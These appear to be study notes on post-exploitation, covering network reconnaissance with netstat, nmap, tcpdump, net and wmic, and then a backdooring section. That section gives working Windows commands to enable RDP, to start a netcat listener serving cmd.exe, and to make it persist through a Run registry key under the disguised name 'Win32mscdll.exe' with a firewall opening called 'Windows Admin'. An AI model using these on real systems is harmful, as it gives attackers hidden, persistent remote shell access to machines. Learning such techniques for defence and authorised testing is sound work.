# Post Exploitation Hacking

## Linux Networking

### Explore Localhost

* `netstat` tells you almost everything you need to know about a system about what it's doing over the network.
  - `nestat -g`：Group memberships.
  - `netstat -r`: Routing table.
  - `netstat -i`: Kernel interface table.
  - `netstat -s`: Statistics (of various protocols).
  - `netstat —-tcp`: Show tcp connections.
  - `netstat —-udp`
  - `netstat —-raw`
* `arp` tells you something about the ARP.
* `nsswitch.conf` GNU Name Service Switch functionality.
* `resolve.conf` DNS information. Usually contains one line `nameserver xxx.xxx.xxx.xxx`.

### Linux Sniffing Tools

* `p0f`: completely passive packets sniffer and analyzer. The functionality is similar to wireshark.
  * `sudo p0f src port 22 or dst port 22`

  Usually used in combination with scanners.

* `tcpdump`: packet sniffer printing information about packets.

  * `-A`: print each packet in ASCII (handy for capturing web pages)
  * `-I`: turn on monitor mode, supported only on IEEE 802.11 Wifi interfaces.

* `tshark`: command-line wireshark, very verbose, very useful

### Linux Scanning Tools

* `arp-scan`: scan local network for devices
  * `arp-scan 192.168.0.0-192.168.0.255`
* `nmap`: powerful scanning tool.
  * Determine hosts on the network, identify services, fingerprint OS's and so much more.
  * `-sL`: list targets to scan (don't do real thing)
  * `-sn`: ping scan (don't scan ports)
  * `-Pn`: opposite of `-sn`, assume the machines are all on, skip ping scan
  * `-PS/PA/PU/PY`: TCP SYN/ACK, UDP or SCTP discovery to given ports
  * `-PE/PP/PM`: ICMP echo, timestamp, and netmask request
  * `-PO`: IP protocol ping
  * `-n/-R`: never/always do DNS resolution (default is sometimes)
  * `—dns-servers`: specify custome DNS servers
  * `—traceroute`: trace hop path to each host
  * `-sS/sT/sA/sW/sM`: TCP SYN/Connect()/ACK/Window/Maimon scans
  * `-sU`: UDP scan
  * `-sN/sF/sX`: TCP Null, FIN and Xmas scans
  * `—scanflags <flags>`: Customize TCP scan flags
  * `-sI`: idle scan (test if a host is being operated by human, etc.)
  * `-p<port ranges>`: specify ports `-p22`, `-p1-65535`, `-p U:53,111,137,T:21-25,80,139,8080,S:9`
  * `-F`: fast mode, scan fewer ports than default
  * `-r`: turn off randomization, scan consequtively, not suggested, very noticeable
  * `—top-ports <number>`: scan <number> most common ports
  * `—port-ratio <ratio>`: scan ports more common than <ratio>
  * `-sV`: probe open ports to determine service/version info
  * `--version-intensity <level>`: set from 0 to 9
  * `—version-light`: limit to most likely probes

## Windows Networking

### Windows Hosting Tools

* `iponfig`: network interface information.
  *  `ipconfig /all`: all the information, including DNS.
    * Physical address
    * DHCP enabled
    * Subnet Mask
    * Lease obtained/expires
    * Default gateway
    * DNS servers
  *  `ipconfig /help`: doesn't give very much information.
* `netstat`:  Pretty much the same to that in linux.
* `arp`: For MAC addresses and IP addresses binding.
* `net`: administration tool for Windows clients and servers. Tons of options.
  * `net localgroup`: groups on this machine (like `groups` command in linux)
  * `net config`: configuration information about workstation or server service.
  * `net share`: share something
    * `net share sharename=C:\`
    * `net share /delete sharename`
  * `net user`: user accounts on this machine
  * `net accounts`: show or update information like password max/min ages, logon limitations, domain information.
  * `net session`: list or operate on sessions between this computer and others. By `net session \\ComputerName /delete` you can force ending a connection (only use in emergency).
  * `net statistics`: output some statistics about `server` or `workstation`.
  * `net view`: displays resources being shared on a computer. Or display the detailed information of something shared by a particular computer `net view \\ComputerName`.
  * `net start`:  lists running services.
  * `net help`
* `wmic`: Windows Management Instrumentation Command-line.
  * `wmic useraccount`: displays a lot of information about all the user accounts in the computer.
  * `wmic startup`: get a list of (caption, command).


### Windows Network Tools

* `nslookup`: DNS tool identifying a DNS server. Start a command line interface with a prompt `>`.


## Persistence and Backdooring

* Goals:
  * Various methods of backdooring a system
  * Main types of backdoors:
    * RDP
    * LIstening Shell
    * New User
  * Couple of ways to hide backdoors among normal data

### Remote Desktop Protocol - RDP

* Disable firewall (by adding a firewall rule)

  ```batch
  netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
  ```

  * `netsh`: network administration tool
  * `advfirewall`: specify working with Windows advanced firewall
  * `firewall`: specify this is a firewall operation
  * `set rule group="remote desktop"`: assign a value to that group
  * `new enable=Yes`: allow RDP connections

* Add registry entry

  ```batch
  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
  ```

  * `reg add`: add something new to registry
  * `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server`: the key
  * `/v fDenyTSConnections`: the value to set
  * `/t REG_DWORD`: the data type (`int/DWORD/string/etc`)
  * `/d 0`: the actually value
  * `/f`: force overwritting the existing value

* Windows Native RDP: already installed, can be configured on command line. Disabled by several versions of Windows.

* Chrome RDP: has to be installed from elsewhere. Can be used through SSH. Version independent.

### TFTP

Simple version of FTP protocol. Default port 69.

### Netcat

* `nc`

  * `-4`: use IPv4 only
  * `-6`: use IPv6 only
  * `-C`: use CRLF
  * `-c`: execute command via `/bin/sh`
  * `-e`: execute command
  * `-m`: maximum number of connections
  * `-d`: delay read/write, reduce the data passed through network
  * `-o`: dump the session data to file
  * `-x`: dump in hex
  * `-p`: port
  * `-s`: source address to use
  * `-l`: listen for incoming connections
  * `-k`: keep open
  * `-u`: use UDP

* `nc -lkp 51000 -e "cmd.exe"`

* Set it to run (as administrator) at startup: `reg add HKLM\software\microsoft\windows\currentversion/run /v Win32mscdll.exe /t REG_MULTI_SZ /d "ncat.exe -lkp 12345 cmd.exe"`

* Disable firewall:

  ```batch
  netsh firewall add portopening TCP 12345 "Windows Admin" ENABLE ALL
  netsh firewall show portopening
  ```

